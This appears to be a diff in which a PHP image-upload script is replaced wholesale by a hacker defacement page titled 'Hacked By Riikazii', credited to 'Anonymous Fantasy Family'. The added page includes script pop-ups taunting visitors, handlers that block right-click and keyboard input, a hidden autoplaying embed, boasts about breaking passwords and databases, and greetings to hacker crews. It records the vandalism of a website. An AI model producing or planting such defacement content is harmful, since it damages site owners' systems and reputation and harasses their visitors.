@@ -1,87 +1,182 @@
-<?php
-// Accept an image that is 512x512, and return the previous image that has been given to it.
-// By Matt Mets, 2012
-// 
-// Basic idea from these places:
-// Image uploading: http://www.w3schools.com/php/php_file_upload.asp
-// file locking: http://php.net/manual/en/function.flock.php
-
-$allowedExts = array("jpg", "jpeg", "gif", "png");
-$extension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
-$size = getimagesize($_FILES["file"]["tmp_name"]);
-
-// echo $size[0] . " " . $size[1] . " " . $_FILES["file"]["type"] . " " . $_FILES["file"]["size"] . " " . $_FILES["file"]["name"];
-
-if ((($_FILES["file"]["type"] == "image/gif")
-|| ($_FILES["file"]["type"] == "image/jpeg")
-|| ($_FILES["file"]["type"] == "image/png")
-|| ($_FILES["file"]["type"] == "image/pjpeg"))
-&& ($_FILES["file"]["size"] < 400000)
-&& in_array($extension, $allowedExts)
-&& ($size[0] == 512)
-&& ($size[1] == 512))
-  {
-  if ($_FILES["file"]["error"] > 0)
-    {
-    echo "ERROR Return Code: " . $_FILES["file"]["error"] . "<br />";
-    }
-  else
-    {
-    $new_name= "upload/" . basename($_FILES["file"]["tmp_name"]) . "." . pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
-
-//    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
-//    echo "Type: " . $_FILES["file"]["type"] . "<br />";
-//    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
-//    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";
-
-    if (file_exists($new_name))
-      {
-      echo $new_name . "ERROR already exists. ";
-      }
-    else
-      {
-      move_uploaded_file($_FILES["file"]["tmp_name"],
-      $new_name);
-
-      // Now, try to append it to our list
-      $fp = fopen("uploads.txt", "a");
-
-      if (flock($fp, LOCK_EX))
-        {  // acquire an exclusive lock
-        $last_name = `tail -n 1 uploads.txt`;
-
-        fwrite($fp, $new_name . "\n");
-        fflush($fp);            // flush output before releasing the lock
-        flock($fp, LOCK_UN);    // release the lock
-
-//        echo "Stored in: " . $new_name . "<br />";
-//        echo "<img src=" . $new_name . " />" . "<br />";
 
 
-        if ($last_name <> '')
-          {
-          echo "SUCCESS " . $last_name . "<br />";
-//        echo "<img src=" . $last_name . " />" . "<br />";
-          }
-        else
-          {
-          echo "FAILURE no file to return";
-          }
+<!-- *** Anonymous Fantasy Family Defacer team *** --> 
 
-        }
-      else
-        {
-        echo "ERROR Couldn't get the lock!";
-        }
+<html>
 
-      fclose($fp);
+<link rel="shortcut icon" type="image/png" href="http://aux.iconpedia.net/uploads/19274250741916216090.png" />
 
-      }
-    }
-  }
-else
-  {
-  echo "ERROR Invalid file";
-  }
-?>
+<title>Hacked By Riikazii</title>
 
+
+
+</head>
+
+<body bgcolor="#000000" text="white">
+
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" bgcolor="black">
+
+<center>
+
+<center><embed src="http://www.youtube.com/v/fiTLy9Iq6zE&v?version=3&amp;hl=en_US&autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed></center>
+
+<center>
+
+<br><br>
+
+<img src="http://www.sman1kotabaru.sch.id/userfiles/AFF.jpg" title="Single Attacker" />
+
+</script><SCRIPT> alert("Your Site Has Been Hacked!") ; prompt("wakakakak your site has been hacked by Riikazii..wakaka..") ; alert("do you mad?? wakakaka")</SCRIPT>
+
+<style type="text/css">
+
+
+
+
+
+
+
+body{
+
+
+
+
+
+
+
+cursor:no-drop;
+
+
+
+
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+
+
+
+
+
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" bgcolor="black">
+
+
+
+
+
+<p align="center"><font color="#666666" size="4" face="Courier New"><strong></strong></font></p>
+
+
+
+<p align="center"><font color="Red" size="5" face="Verdana"><strong><blink>Warning!</blink></strong></font></p>
+
+ 
+
+<p align="center"><font color="seashell" size="2" face="Tahoma"><strong><font color="#D3D3D3" size="2" face="Tahoma"><strong></strong></font></p>
+
+ 
+
+
+
+
+
+<p align="center"><font color="#666666" size="4" face="Courier New"><strong></strong></font></p>
+
+
+
+<p align="center"><font color="Red" size="4" face="Courier New"><strong>Riikazii Was Here~<font color="#D3D3D3" size="2" face="Tahoma"><strong></strong></font></p>
+
+
+
+<p align="center"><font color="Red" size="2" face="Courier New"><strong>We Damaging Your System,</strong></font></p>
+
+
+<p align="center"><font color="Red" size="3" face="Courier New"><strong>We Unravel Your Database,</strong></font></p>
+
+
+
+<p align="center"><font color="Red" size="3" face="Courier New"><strong>We Break Your Password,</strong></font></p>
+
+<p align="center"><font color="Red" size="2" face="Courier New"><strong>We Hack Your Security</strong></font></p>
+
+
+
+<p align="center"><font color="Red" size="2" face="Courier New"><strong>>We Will Come Back...Anonymous Fantasy Family</strong></font></p>
+
+<p align="center"><font color="Red" size="2" face="Courier New"><strong>Dont Worry Repair Your System And Patch Your Security !</strong></font></p>
+
+<p align="center"><font color="seashell" size="3" face="Courier new"><strong><font color="#D3D3D3" size="2" face="Tahoma"><strong></strong></font></p>
+
+<p align="center"><font color="seashell" size="2" face="Courier New"><strong></strong></font></p>
+
+<p align="center"><font color="seashell" size="2" face="Courier New"><strong></strong></font></p>
+
+<p align="center"><font color="seashell" size="2" face="Fixed Miriam Transparent"><strong>THANKS AND GREETZ TO : <font color="yellow" size="2" face="Tahoma"><strong></strong></font></p>
+
+
+
+<p align="center"><font color="seashell" size="2" face="Courier New"><strong></strong></font></p>
+
+<p align="center"><font color="Red" size="2" face="Courier New"><strong></strong></font></p>
+
+
+
+<p align="center"><font color="purple" size="2" face="Courier New"><strong>Riikazii , ExNonymous,Squad Hacker ,ZeroHacker ZHC,Abd Aziz Stylo ,White Hat Hacker Crew[WHHC] and all ANONYMOUS FANTASY FAMILY MEMBER ~<font color="#D3D3D3" size="2" face="Tahoma"><strong></strong></font></p>
+
+
+
+<p align="center"><font color="Red" size="2" face="Courier New"><strong></strong></font></p>
+
+<p align="center"><font color="seashell" size="2" face="Courier New"><strong>_________________________________________________________________________________________________________________________________________</strong></font></p>
+
+</center>
+
+<div id="mem_ft">
+
+    <p>
+
+        
+
+        
+
+        <p align="center"><font color="green" size="2" face="Courier New"><strong>We hack because we want :P </strong></font></p></a>
+
+      
+
+</div>
+
+    </div>
+
+
+
+<font color="#00FF00">
+
+
+
+</body><br />
